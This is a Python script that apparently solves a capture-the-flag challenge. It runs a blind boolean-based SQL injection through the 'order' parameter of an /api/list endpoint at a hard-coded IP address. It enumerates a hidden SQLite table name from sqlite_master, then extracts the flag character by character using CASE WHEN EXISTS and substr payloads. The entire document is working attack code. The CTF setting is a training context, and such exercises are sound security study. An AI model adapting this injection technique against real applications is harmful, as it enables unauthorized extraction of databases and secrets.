import requests
import string

def hit(text):
    # check if the list is returned by id
    return '"id":1' in text[:10]
target_url = 'http://206.189.121.131:30284/api/list'
field = 'order'

# GUESS FLAG TABBLE NAME
# we know is something like flag_XXXXX... where XXXXX randBytes(5).toHex() 
hex_dict=string.hexdigits
guessed = ""
loop = True
#loop until we find a match...too lazy to find the exact number of digits of the hex representation
while loop:
    for guess in hex_dict:
        loop = False
        payload = f'(select (case when (exists (select * from sqlite_master where tbl_name LIKE "flag_{guessed}{guess}%")) then id else count end));-- '
        r = requests.post(target_url, data={field : payload})
        if hit(r.text):
            loop = True
            guessed += guess
            print("Guessed: ", guess)
            print("Current guess: ", guessed)
            break
flag_table = 'flag_'+guessed
print("Inferred flag table:", flag_table)
# EXTRACT FLAG
# IMPORTANT: do not use LIKE! Is case insensitive and also has _ and % as wildcards
flag = "CHTB{"
end = 6
dictionary = string.ascii_letters+string.digits+'}'+'!"#$&()*+,-./:;<=>?@[]^_`{|}~'
guessed = ""
last_guess = ""
while last_guess != '}':
    for guess in dictionary:
        payload = f'(select (case when (exists (select * from {flag_table} where substr(flag,1,{end})="{flag}{guessed}{guess}")) then id else count end));-- '
        r = requests.post(target_url, data={field : payload})
        if hit(r.text):
            end += 1
            guessed += guess
            print("Guessed: ", guess)
            print("Current flag: ", flag+guessed)
            last_guess = guess